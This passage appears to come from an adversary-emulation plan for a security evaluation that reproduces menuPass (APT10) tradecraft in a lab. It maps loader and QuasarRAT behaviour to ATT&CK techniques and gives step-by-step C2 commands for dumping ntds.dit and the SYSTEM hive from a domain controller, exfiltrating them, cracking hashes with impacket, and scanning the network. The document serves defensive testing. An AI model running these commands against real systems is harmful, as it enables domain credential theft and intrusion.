<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:%7E:text=The%20layer%20I%20loader%20decrypts%20the%20layer%20II%20loader%20shellcode%20from%20the%20embedded%20data" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SigLoader decrypts shellcode (combination of XOR/AES/DES)</td>
<td><a href="../../resources/sigloader/src/layer1_loader.cpp#L272">decrypt</a></td>
<td>T1140 Deobfuscate/Decode Files or Information</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:%7E:text=The%20layer%20I%20loader%20decrypts%20the%20layer%20II%20loader%20shellcode%20from%20the%20embedded%20data" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SigLoader reflectively loads and executes FYAnti</td>
<td><a href="../../resources/sigloader/src/layer1_loader.cpp#L75">run_code</a></td>
<td>T1620 Reflective Code Loading</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:%7E:text=other%20SodaMaster%20samples.-,FYAnti%20loader%20for%20QuasarRAT,-The%20last%20observed" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>FYAnti contains an embedded .NET assembly</td>
<td><a href="../../resources/fyanti/src/native-loader/main.cpp#L7-L19">embedded.hpp</a></td>
<td>T1027.009 Obfuscated Files or Information: Embedded Payloads</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>FYAnti reflectively loads and executes the QuasarRAT loader via CppHostClr</td>
<td><a href="../../resources/fyanti/src/native-loader/main.cpp#L36-L48">execute_ssembly</a></td>
<td>T1620 Reflective Code Loading</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT loader is obfuscated using ConfuserEx</td>
<td><a href="../../resources/fyanti/src/managed-loader/confusersettings.crproj.in">ConfuserEx Settings</a></td>
<td>T1027.002 Obfuscated Files or Information: Software Packing</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT loader decrypts QuasarRAT</td>
<td><a href="../../resources/fyanti/src/managed-loader/main.cs#L159">Decrypt</a></td>
<td>T1140 Deobfuscate/Decode Files or Information</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> <a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT loader loads and executes QuasarRAT</td>
<td><a href="../../resources/fyanti/src/managed-loader/main.cs#L59-L70">FindModule, Invoke</a></td>
<td>T1620 Reflective Code Loading</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> <a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT communicates over TCP</td>
<td><a href="../../resources/quasar/quasar.client/networking/client.cs#L269">Connect</a></td>
<td>T1095 Non-Application Layer Protocol</td>
<td><a href="https://github.com/quasar/Quasar" class="outbound" target="_blank"><span>Quasar Github</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT C2 communications use TLS</td>
<td><a href="../../resources/quasar/quasar.client/networking/client.cs#L283-L284">SslStream</a></td>
<td>T1573.002 Encrypted Channel: Asymmetric Cryptography</td>
<td><a href="https://github.com/quasar/Quasar" class="outbound" target="_blank"><span>Quasar Github</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT C2 communications are encrypted with symmetric encryption</td>
<td><a href="../../resources/quasar/quasar.client/networking/client.cs#L283-L292">Connect</a></td>
<td>T1573.001 Encrypted Channel: Symmetric Cryptography</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
 </details>
<br>
<doc-anchor-target id="step-5---credential-access-and-discovery">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-5---credential-access-and-discovery">#</doc-anchor-trigger>
        <span>Step 5 - Credential Access and Discovery</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>After gaining access on the Subsidiary A Domain Controller <code v-pre>parrotmon (10.10.10.4)</code>,
menuPass uses the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code> to execute the native <code v-pre>ntdsutil.exe</code> utility to export
the Active Directory database to <code v-pre>ntds.dit</code>. Then, menuPass uses QuasarRAT to
exfiltrate the generated <code v-pre>ntds.dit</code> and <code v-pre>SYSTEM</code> hive files then dumps
credentials offline to retrieve hashes of authenticated users. These hashes are
cracked offline to retrieve plaintext passwords for the domain users.</p>
<p>menuPass then performs an internal port scan to search for open RDP and SMB
ports on the network. A reverse nslookup is then performed against the active
IP addresses to resolve the hostnames.</p>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, execute <code v-pre>whoami</code> to get the user SID of kizumi.da</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 1, &quot;proc_path&quot;:&quot;whoami.exe&quot;, &quot;proc_args&quot;: &quot;/all&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, create folder <code v-pre>$RCXNYCG</code> in kizumi.da&#x27;s
Recycle Bin (<code v-pre>C:\$Recycle.Bin\S-1-5-21-156812349-472333277-3174882868-1109\$RCXNYCG</code>).</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 1, &quot;proc_path&quot;:&quot;cmd.exe&quot;, &quot;proc_args&quot;: &quot;/c mkdir C:\\$Recycle.Bin\\S-1-5-21-156812349-472333277-3174882868-1109\\$RCXNYCG&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, execute <code v-pre>ntdsutil.exe</code> to generate <code v-pre>ntds.dit</code>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 1, &quot;proc_path&quot;:&quot;ntdsutil.exe&quot;, &quot;proc_args&quot;: &quot;\&quot;ac i ntds\&quot; \&quot;i\&quot; \&quot;c f C:\\$Recycle.Bin\\S-1-5-21-156812349-472333277-3174882868-1109\\$RCXNYCG\&quot; q q&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, exfiltrate the generated <code v-pre>ntds.dit</code> file.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 3, &quot;transfer_src&quot;: &quot;C:\\$Recycle.Bin\\S-1-5-21-156812349-472333277-3174882868-1109\\$RCXNYCG\\Active Directory\\ntds.dit&quot;, &quot;transfer_dst&quot;: &quot;ntds.dit&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, exfiltrate the generated <code v-pre>SYSTEM</code> file</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 3, &quot;transfer_src&quot;: &quot;C:\\$Recycle.Bin\\S-1-5-21-156812349-472333277-3174882868-1109\\$RCXNYCG\\registry\\SYSTEM&quot;, &quot;transfer_dst&quot;: &quot;SYSTEM&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using impacket, locally dump credentials to retrieve hashes of authenticated users, validate the NTLM hash of kizumi.da is contained in the output:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">impacket-secretsdump -system files/SYSTEM -ntds files/ntds.dit local | grep 6265fbabbdaa3ee71df61bd9f3c77d68</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, port scan the workstations of the Subsidiary A network.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 5, &quot;range&quot;: &quot;10.10.20.0/24&quot;, &quot;ports&quot;:[22, 53, 80, 445, 3389], &quot;timeout&quot;: 300}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using the QuasarRAT implant on the Subsidiary A Domain Controller
<code v-pre>parrotmon (10.10.10.4)</code>, execute nslookup against the active hosts. <strong>Wait until each command has returned before executing the next</strong>.</p>
<ol>
<li><p><code v-pre>phantomon</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 1, &quot;proc_path&quot;:&quot;nslookup.exe&quot;, &quot;proc_args&quot;: &quot;10.10.20.11&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p><code v-pre>ghostmon</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 1, &quot;proc_path&quot;:&quot;nslookup.exe&quot;, &quot;proc_args&quot;: &quot;10.10.20.22&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p><code v-pre>cecilmon</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 7C2AA823335FAE8D17090D191845A725 '{&quot;type&quot;: 1, &quot;proc_path&quot;:&quot;nslookup.exe&quot;, &quot;proc_args&quot;: &quot;10.10.20.23&quot;}'</code></pre>
</doc-codeblock></div>
</li>
</ol>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<ol>
<li><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf">http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf</a></li>
<li><a href="https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf">https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf</a></li>
<li><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf">https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf</a></li>
</ol>
 <details>
   <summary>:link: Click to expand source code links table</summary>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>QuasarRAT execute commands</td>
<td><a href="../../resources/quasar/quasar.client/messages/taskmanagerhandler.cs#L179">ExecuteProcess</a></td>
<td>T1106 Native API</td>
<td><a href="https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor" class="outbound" target="_blank"><span>BlackBerry</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>QuasarRAT creates folder <code v-pre>$RCXNYCG</code> in kizumi.da&#x27;s Recycle Bin</td>
<td>-</td>
<td>T1074.001 Data Staged: Local Data Staging</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-report-april-2017.pdf" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Execute ntdsutil.exe</td>
<td>-</td>
<td>T1003.003 OS Credential Dumping: NTDS</td>
<td><a href="https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Exfiltrate ntds.dit from Recycle Bin</td>
<td>-</td>
<td>T1041 Exfiltration Over C2 Channel</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-report-april-2017.pdf" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>Exfiltrate SYSTEM from Recycle Bin</td>
<td>-</td>
<td>T1041 Exfiltration Over C2 Channel</td>
